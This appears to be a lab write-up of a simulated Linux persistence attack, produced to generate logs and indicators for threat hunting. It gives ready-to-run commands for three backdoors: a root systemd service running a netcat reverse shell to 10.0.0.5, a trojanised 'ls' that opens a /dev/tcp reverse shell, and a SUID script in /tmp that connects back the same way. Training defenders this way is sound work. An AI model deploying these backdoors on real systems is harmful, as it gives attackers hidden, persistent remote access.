# Threat Event (Persistence)

**Unauthorized Persistence Mechanisms Creation**

## Steps the "Bad Actor" took to Create Logs and IoCs:

1. Downloaded and installed a **malicious systemd service** to ensure the backdoor would automatically start on system reboot.
- The service was configured to run a reverse shell or malicious command to maintain access after rebooting the system.

```# Create a malicious systemd service that will ensure persistence by executing a reverse shell
echo '[Unit]
Description=Malicious Service
After=network.target

[Service]
ExecStart=/bin/bash -c "nc -e /bin/bash 10.0.0.5 4444"
Restart=always
User=root

[Install]
WantedBy=multi-user.target' > /etc/systemd/system/malicious.service

# Enable and start the malicious service
sudo systemctl enable malicious.service
sudo systemctl start malicious.service
```

2. Replaced the legitimate `ls` command with a Trojanized script located at `/home/baddog/.local/bin/ls`.
- This Trojanized script was designed to execute a reverse shell when invoked, providing continued access to the system without raising suspicion.

```
echo '#!/bin/bash
/bin/bash -i >& /dev/tcp/10.0.0.5/4444 0>&1' > /home/baddog/.local/bin/ls
chmod +x /home/baddog/.local/bin/ls
```

3. **Created a backdoor shell at `/tmp/rootbash`, set the **SUID permission** on the shell (`chmod u+s /tmp/rootbash`), and made it executable by any user.
- This backdoor shell was designed to escalate privileges and grant root access, regardless of the user executing

```
echo '#!/bin/bash
/bin/bash -i >& /dev/tcp/10.0.0.5/4444 0>&1' > /tmp/rootbash
chmod u+s /tmp/rootbash
chmod +x /tmp/rootbash
```
